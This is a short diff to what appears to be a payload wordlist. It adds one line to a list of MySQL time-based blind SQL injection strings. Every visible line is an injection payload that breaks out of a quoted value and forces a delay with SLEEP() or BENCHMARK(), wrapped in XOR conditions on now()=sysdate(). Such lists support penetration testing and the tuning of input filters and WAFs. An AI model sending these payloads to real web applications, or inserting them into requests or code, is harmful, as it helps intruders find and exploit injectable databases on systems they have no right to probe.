@@ -6,6 +6,7 @@ X'XOR(if(now()=sysdate(),//sleep(15)//,0))XOR'X
 X'XOR(if(now()=sysdate(),(sleep((((15))))),0))XOR'X
 X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X
 'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
+if(now()=sysdate(),SLEEP(10),0)
 (SELECT(0)FROM(SELECT(SLEEP(6)))a)
 'XOR(if(now()=sysdate(),sleep(10*10),0))OR'
 'XOR(if(now()=sysdate(),sleep(10*10*0),0))OR'
